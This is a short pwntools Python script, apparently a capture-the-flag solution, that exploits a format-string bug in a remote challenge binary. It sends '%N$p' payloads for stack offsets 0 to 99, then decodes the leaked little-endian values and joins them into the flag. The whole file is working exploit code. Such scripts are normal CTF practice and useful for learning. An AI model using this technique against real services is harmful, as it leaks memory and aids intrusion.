#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'warn'
host, port = '', 1337


# =========================================================
#                           FUZZ
# =========================================================

flag = ''

for i in range(0, 100): # Range is obtained by fuzzing locally 
    try:
        io = remote(host, port)

        io.sendlineafter(b'>', f'%{i}$p'.encode())
        io.recvuntil(b'  ')
        leak = io.recv()

        if not b'(nil)' in leak:
            print(f'stack at-{i}' + ": " + str(leak))
            try:
                hexform = unhex(leak.split()[0][2:].decode())
                flag += hexform.decode()[::-1]
                print("flag appended")
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

# Print flag
print(f'{flag=}')